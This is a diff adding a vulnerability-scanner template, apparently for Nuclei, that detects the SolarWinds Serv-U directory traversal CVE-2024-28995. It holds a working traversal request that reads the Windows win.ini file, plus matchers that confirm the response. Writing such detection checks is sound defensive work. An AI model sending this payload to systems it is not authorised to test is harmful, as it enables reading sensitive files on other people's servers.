@@ -1,0 +1,31 @@
+id: cve-2024-28995-solarwinds-serv-u-directory-traversal
+info:
+  name: SolarWinds Serv-U Directory Traversal (CVE-2024-28995)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, cve2024, directory-traversal, serv-u
+  description: |
+    SolarWinds Serv-U is vulnerable to a directory traversal attack that allows attackers to access sensitive files.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?InternalDir=/../../../../windows&InternalFile=win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[files]"
+      - type: word
+        part: header
+        words:
+          - "Server: Serv-U"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
